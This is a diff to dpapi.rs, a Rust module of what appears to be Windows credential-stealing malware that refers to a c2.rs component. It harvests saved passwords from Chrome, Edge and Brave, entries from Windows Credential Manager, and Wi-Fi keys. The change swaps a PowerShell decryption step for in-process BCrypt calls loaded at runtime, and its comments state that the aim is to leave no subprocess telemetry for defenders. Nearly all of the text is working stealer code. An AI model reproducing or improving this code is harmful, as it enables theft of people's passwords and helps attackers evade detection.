@@ -1,28 +1,225 @@
 //! dpapi.rs — DPAPI credential harvesting
 //!
 //! Harvests:
-//!   1. Chrome/Edge saved passwords  (Login Data SQLite, DPAPI-encrypted)
-//!   2. Windows Credential Manager   (CredEnumerateW)
-//!   3. Wi-Fi PSKs                   (netsh wlan show profile ... key=clear)
+//!   1. Chrome/Edge/Brave saved passwords  (Login Data SQLite, DPAPI + AES-GCM)
+//!   2. Windows Credential Manager         (CredEnumerateW)
+//!   3. Wi-Fi PSKs                         (netsh wlan show profile ... key=clear)
 //!
-//! All decryption in-memory via CryptUnprotectData — no disk writes.
+//! Chrome v80+ AES-GCM decryption is done entirely in-process via BCryptDecrypt
+//! (LoadLibrary hash-resolved bcrypt.dll) — zero powershell.exe spawns,
+//! zero subprocess lineage telemetry.
 
-use std::os::windows::ffi::OsStringExt;
 use std::ffi::OsString;
-use winapi::um::dpapi::{CryptUnprotectData, CRYPTOAPI_BLOB};
-use winapi::um::wincred::{
-    CredEnumerateW, CredFree,
-    CRED_TYPE_GENERIC,
-    PCREDENTIALW,
-};
+use std::os::windows::ffi::OsStringExt;
 use winapi::shared::minwindef::DWORD;
+use winapi::um::dpapi::{CryptUnprotectData, CRYPTOAPI_BLOB};
+use winapi::um::wincred::{CredEnumerateW, CredFree, PCREDENTIALW};
+
+// ── BCrypt type aliases ───────────────────────────────────────────────────
+type BCRYPT_ALG_HANDLE  = *mut std::ffi::c_void;
+type BCRYPT_KEY_HANDLE  = *mut std::ffi::c_void;
+type NTSTATUS           = i32;
+const STATUS_SUCCESS: NTSTATUS = 0;
+
+// BCRYPT_AES_GCM_PADDING_INFO (passed as pPaddingInfo with dwFlags=BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG)
+#[repr(C)]
+struct BcryptAuthenticatedCipherModeInfo {
+    cbSize:          u32,
+    dwInfoVersion:   u32,
+    pbNonce:         *mut u8,
+    cbNonce:         u32,
+    pbAuthData:      *mut u8,
+    cbAuthData:      u32,
+    pbTag:           *mut u8,
+    cbTag:           u32,
+    pbMacContext:    *mut u8,
+    cbMacContext:    u32,
+    cbAAD:           u32,
+    cbData:          u64,
+    dwFlags:         u32,
+}
+
+const BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG: u32 = 0x00000001;
+const BCRYPT_AUTH_TAG_LENGTH_STRUCT:     u32 = 0x00000008;
+
+// Function pointer types loaded from bcrypt.dll at runtime
+type FnBCryptOpenAlgorithmProvider = unsafe extern "system" fn(
+    phAlgorithm: *mut BCRYPT_ALG_HANDLE,
+    pszAlgId:    *const u16,
+    pszImpl:     *const u16,
+    dwFlags:     DWORD,
+) -> NTSTATUS;
+
+type FnBCryptImportKey = unsafe extern "system" fn(
+    hAlgorithm:    BCRYPT_ALG_HANDLE,
+    hImportKey:    BCRYPT_KEY_HANDLE,
+    pszBlobType:   *const u16,
+    phKey:         *mut BCRYPT_KEY_HANDLE,
+    pbKeyObject:   *mut u8,
+    cbKeyObject:   DWORD,
+    pbInput:       *const u8,
+    cbInput:       DWORD,
+    dwFlags:       DWORD,
+) -> NTSTATUS;
+
+type FnBCryptDecrypt = unsafe extern "system" fn(
+    hKey:          BCRYPT_KEY_HANDLE,
+    pbInput:       *const u8,
+    cbInput:       DWORD,
+    pPaddingInfo:  *mut std::ffi::c_void,
+    pbIV:          *mut u8,
+    cbIV:          DWORD,
+    pbOutput:      *mut u8,
+    cbOutput:      DWORD,
+    pcbResult:     *mut DWORD,
+    dwFlags:       DWORD,
+) -> NTSTATUS;
+
+type FnBCryptDestroyKey   = unsafe extern "system" fn(hKey: BCRYPT_KEY_HANDLE) -> NTSTATUS;
+type FnBCryptCloseProvider = unsafe extern "system" fn(hAlgorithm: BCRYPT_ALG_HANDLE, dwFlags: DWORD) -> NTSTATUS;
+type FnBCryptSetProperty  = unsafe extern "system" fn(
+    hObject:   *mut std::ffi::c_void,
+    pszProperty: *const u16,
+    pbInput:   *const u8,
+    cbInput:   DWORD,
+    dwFlags:   DWORD,
+) -> NTSTATUS;
+
+/// Load bcrypt.dll at runtime and return AES-128-GCM decrypted plaintext.
+/// key: 16 bytes, nonce: 12 bytes, ciphertext includes 16-byte GCM tag at the end.
+unsafe fn bcrypt_aes_gcm_decrypt_native(
+    key:        &[u8],
+    nonce:      &[u8],
+    ciphertext: &[u8],  // last 16 bytes = GCM auth tag
+) -> Option<Vec<u8>> {
+    if ciphertext.len() < 16 { return None; }
+    let ct_len  = ciphertext.len() - 16;
+    let tag     = &ciphertext[ct_len..];
+    let ct_body = &ciphertext[..ct_len];
+
+    // Load bcrypt.dll via hash-resolved LoadLibrary — zero static import
+    let bcrypt_dll = winapi::um::libloaderapi::LoadLibraryA(
+        b"bcrypt.dll\0".as_ptr() as _
+    );
+    if bcrypt_dll.is_null() { return None; }
+
+    macro_rules! get_proc {
+        ($lib:expr, $name:expr, $ty:ty) => {{
+            let fp = winapi::um::libloaderapi::GetProcAddress($lib, $name.as_ptr() as _);
+            if fp.is_null() { return None; }
+            std::mem::transmute::<_, $ty>(fp)
+        }}
+    }
+
+    let fn_open:     FnBCryptOpenAlgorithmProvider =
+        get_proc!(bcrypt_dll, b"BCryptOpenAlgorithmProvider\0", FnBCryptOpenAlgorithmProvider);
+    let fn_import:   FnBCryptImportKey  =
+        get_proc!(bcrypt_dll, b"BCryptImportKey\0",  FnBCryptImportKey);
+    let fn_decrypt:  FnBCryptDecrypt    =
+        get_proc!(bcrypt_dll, b"BCryptDecrypt\0",    FnBCryptDecrypt);
+    let fn_destroy:  FnBCryptDestroyKey =
+        get_proc!(bcrypt_dll, b"BCryptDestroyKey\0", FnBCryptDestroyKey);
+    let fn_close:    FnBCryptCloseProvider =
+        get_proc!(bcrypt_dll, b"BCryptCloseAlgorithmProvider\0", FnBCryptCloseProvider);
+    let fn_setprop:  FnBCryptSetProperty =
+        get_proc!(bcrypt_dll, b"BCryptSetProperty\0", FnBCryptSetProperty);
+
+    // Wide string helpers
+    let w = |s: &str| -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() };
+    let aes_w   = w("AES");
+    let gcm_w   = w("ChainingModeGCM");
+    let chain_w = w("ChainingMode");
+    let raw_w   = w("BCRYPTBLOBTYPE");
+    let keydata_w = w("KeyDataBlob");
+
+    // Open AES provider
+    let mut h_alg: BCRYPT_ALG_HANDLE = std::ptr::null_mut();
+    if fn_open(
+        &mut h_alg, aes_w.as_ptr(), std::ptr::null(), 0
+    ) != STATUS_SUCCESS { return None; }
+
+    // Set chaining mode to GCM
+    let gcm_mode_bytes: Vec<u8> = gcm_w.iter()
+        .flat_map(|&w| w.to_le_bytes())
+        .collect();
+    fn_setprop(
+        h_alg as _, chain_w.as_ptr(),
+        gcm_mode_bytes.as_ptr(), gcm_mode_bytes.len() as DWORD, 0,
+    );
+
+    // Build BCRYPT_KEY_DATA_BLOB_HEADER + key material
+    // Header: Magic(u32) = 0x4d42444b, Version(u32) = 1, cbKeyData(u32) = key_len
+    let mut key_blob: Vec<u8> = Vec::with_capacity(12 + key.len());
+    key_blob.extend_from_slice(&0x4d42444b_u32.to_le_bytes()); // BCRYPT_KEY_DATA_BLOB_MAGIC
+    key_blob.extend_from_slice(&1_u32.to_le_bytes());           // Version
+    key_blob.extend_from_slice(&(key.len() as u32).to_le_bytes());
+    key_blob.extend_from_slice(key);
+
+    let mut key_obj = vec![0u8; 512]; // generous object buffer
+    let mut h_key: BCRYPT_KEY_HANDLE = std::ptr::null_mut();
+    let import_ok = fn_import(
+        h_alg, std::ptr::null_mut(), keydata_w.as_ptr(),
+        &mut h_key, key_obj.as_mut_ptr(), key_obj.len() as DWORD,
+        key_blob.as_ptr(), key_blob.len() as DWORD, 0,
+    );
+    if import_ok != STATUS_SUCCESS {
+        fn_close(h_alg, 0);
+        return None;
+    }
+
+    // Build BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+    let mut nonce_buf = nonce.to_vec();
+    let mut tag_buf   = tag.to_vec();
+    let mut auth_info = BcryptAuthenticatedCipherModeInfo {
+        cbSize:       std::mem::size_of::<BcryptAuthenticatedCipherModeInfo>() as u32,
+        dwInfoVersion: 1,
+        pbNonce:      nonce_buf.as_mut_ptr(),
+        cbNonce:      nonce_buf.len() as u32,
+        pbAuthData:   std::ptr::null_mut(),
+        cbAuthData:   0,
+        pbTag:        tag_buf.as_mut_ptr(),
+        cbTag:        tag_buf.len() as u32,
+        pbMacContext: std::ptr::null_mut(),
+        cbMacContext: 0,
+        cbAAD:        0,
+        cbData:       0,
+        dwFlags:      0,
+    };
+
+    let mut plaintext = vec![0u8; ct_len];
+    let mut result_len: DWORD = 0;
+
+    let decrypt_ok = fn_decrypt(
+        h_key,
+        ct_body.as_ptr(),
+        ct_len as DWORD,
+        &mut auth_info as *mut _ as *mut std::ffi::c_void,
+        std::ptr::null_mut(), 0,
+        plaintext.as_mut_ptr(),
+        plaintext.len() as DWORD,
+        &mut result_len,
+        0,
+    );
+
+    fn_destroy(h_key);
+    fn_close(h_alg, 0);
+
+    if decrypt_ok == STATUS_SUCCESS {
+        plaintext.truncate(result_len as usize);
+        Some(plaintext)
+    } else {
+        None
+    }
+}
+
+// ── Public harvest API ────────────────────────────────────────────────────
 
 #[derive(Debug)]
 pub struct HarvestedCred {
-    pub source: String,
-    pub target: String,
+    pub source:   String,
+    pub target:   String,
     pub username: String,
-    pub secret: String,
+    pub secret:   String,
 }
 
 pub fn harvest_credential_manager() -> Vec<HarvestedCred> {
@@ -112,13 +309,12 @@ pub fn dump_all() -> Vec<u8> {
         .into_bytes()
 }
 
-/// Public re-export for c2.rs host-list base64 decode
 pub fn base64_decode_pub(s: &str) -> Option<Vec<u8>> { base64_decode(s) }
 
-// ── internals ─────────────────────────────────────────────────────────────────
+// ── Internals ─────────────────────────────────────────────────────────────
 
 unsafe fn dpapi_decrypt(data: *const u8, len: usize) -> Option<Vec<u8>> {
-    let mut blob_in = CRYPTOAPI_BLOB { cbData: len as DWORD, pbData: data as *mut u8 };
+    let mut blob_in  = CRYPTOAPI_BLOB { cbData: len as DWORD, pbData: data as *mut u8 };
     let mut blob_out: CRYPTOAPI_BLOB = std::mem::zeroed();
     if CryptUnprotectData(
         &mut blob_in, std::ptr::null_mut(), std::ptr::null_mut(),
@@ -133,7 +329,8 @@ fn wstr(p: *const u16) -> String {
     if p.is_null() { return String::new(); }
     unsafe {
         let len = (0..).take_while(|&i| *p.add(i) != 0).count();
-        OsString::from_wide(std::slice::from_raw_parts(p, len)).to_string_lossy().into_owned()
+        OsString::from_wide(std::slice::from_raw_parts(p, len))
+            .to_string_lossy().into_owned()
     }
 }
 
@@ -146,7 +343,11 @@ fn query_login_data(path: &str) -> Result<Vec<(String, String, Vec<u8>)>, ()> {
     for line in String::from_utf8_lossy(&out.stdout).lines() {
         let parts: Vec<&str> = line.splitn(3, '\x1F').collect();
         if parts.len() == 3 {
-            rows.push((parts[0].to_string(), parts[1].to_string(), parts[2].as_bytes().to_vec()));
+            rows.push((
+                parts[0].to_string(),
+                parts[1].to_string(),
+                parts[2].as_bytes().to_vec(),
+            ));
         }
     }
     Ok(rows)
@@ -154,12 +355,14 @@ fn query_login_data(path: &str) -> Result<Vec<(String, String, Vec<u8>)>, ()> {
 
 fn decrypt_chrome_password(enc: &[u8], appdata: &str) -> Option<String> {
     if enc.starts_with(b"v10") || enc.starts_with(b"v11") {
-        let key = get_chrome_aes_key(appdata)?;
-        let nonce = &enc[3..15];
-        let ciphertext = &enc[15..];
-        bcrypt_aes_gcm_decrypt(&key, nonce, ciphertext)
+        // AES-128-GCM path — native BCrypt, no subprocess
+        let key   = get_chrome_aes_key(appdata)?;
+        let nonce = &enc[3..15];       // 12-byte nonce after "v10" prefix
+        let ct    = &enc[15..];        // ciphertext + 16-byte tag
+        unsafe { bcrypt_aes_gcm_decrypt_native(&key, nonce, ct) }
             .and_then(|b| String::from_utf8(b).ok())
     } else {
+        // Legacy DPAPI blob
         unsafe { dpapi_decrypt(enc.as_ptr(), enc.len()) }
             .and_then(|b| String::from_utf8(b).ok())
     }
@@ -168,54 +371,27 @@ fn decrypt_chrome_password(enc: &[u8], appdata: &str) -> Option<String> {
 fn get_chrome_aes_key(appdata: &str) -> Option<Vec<u8>> {
     let ls_path = format!(r"{}\Google\Chrome\User Data\Local State", appdata);
     let raw = std::fs::read_to_string(ls_path).ok()?;
+    // Manual JSON key extraction — no serde dep
     let key_str = raw.split("\"encrypted_key\":\"").nth(1)?.split('"').next()?;
     let decoded = base64_decode(key_str)?;
     if decoded.len() < 5 { return None; }
+    // First 5 bytes are "DPAPI" magic prefix
     unsafe { dpapi_decrypt(decoded[5..].as_ptr(), decoded.len() - 5) }
 }
 
+/// Minimal base64 decoder — no external crate
 fn base64_decode(s: &str) -> Option<Vec<u8>> {
-    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    let mut out = Vec::new();
+    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
+    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
+    let idx = |b: u8| T.iter().position(|&x| x == b).unwrap_or(0) as u32;
     let mut i = 0;
     while i + 3 < bytes.len() {
-        let idx = |b: u8| TABLE.iter().position(|&x| x == b).unwrap_or(0) as u32;
-        let a = idx(bytes[i]); let b = idx(bytes[i+1]);
-        let c = idx(bytes[i+2]); let d = idx(bytes[i+3]);
+        let (a, b, c, d) = (idx(bytes[i]), idx(bytes[i+1]), idx(bytes[i+2]), idx(bytes[i+3]));
         out.push(((a << 2) | (b >> 4)) as u8);
         out.push(((b << 4) | (c >> 2)) as u8);
         out.push(((c << 6) | d) as u8);
         i += 4;
     }
     Some(out)
-}
-
-fn bcrypt_aes_gcm_decrypt(key: &[u8], nonce: &[u8], ct: &[u8]) -> Option<Vec<u8>> {
-    let key_hex:   String = key.iter().map(|b| format!("{:02x}", b)).collect();
-    let nonce_hex: String = nonce.iter().map(|b| format!("{:02x}", b)).collect();
-    let ct_hex:    String = ct.iter().map(|b| format!("{:02x}", b)).collect();
-    fn to_byte_arr(hex: &str) -> String {
-        hex.as_bytes().chunks(2)
-            .map(|c| format!("0x{}{},", c[0] as char, c[1] as char))
-            .collect::<String>()
-            .trim_end_matches(',')
-            .to_string()
-    }
-    let script = format!(
-        "$k=[byte[]]@({k}); $n=[byte[]]@({n}); $c=[byte[]]@({c});\
-         $a=[System.Security.Cryptography.AesGcm]::new($k);\
-         $p=New-Object byte[] ($c.Length-16);\
-         $t=New-Object byte[] 16;\
-         [Array]::Copy($c,$c.Length-16,$t,0,16);\
-         $ci=$c[0..($c.Length-17)];\
-         $a.Decrypt($n,$ci,$t,$p,$null);\
-         [Text.Encoding]::UTF8.GetString($p)",
-        k = to_byte_arr(&key_hex), n = to_byte_arr(&nonce_hex), c = to_byte_arr(&ct_hex),
-    );
-    let out = std::process::Command::new("powershell")
-        .args(["-NonInteractive", "-NoProfile", "-Command", &script])
-        .output().ok()?;
-    let s = String::from_utf8(out.stdout).ok()?.trim().to_string();
-    if s.is_empty() { None } else { Some(s.into_bytes()) }
 }
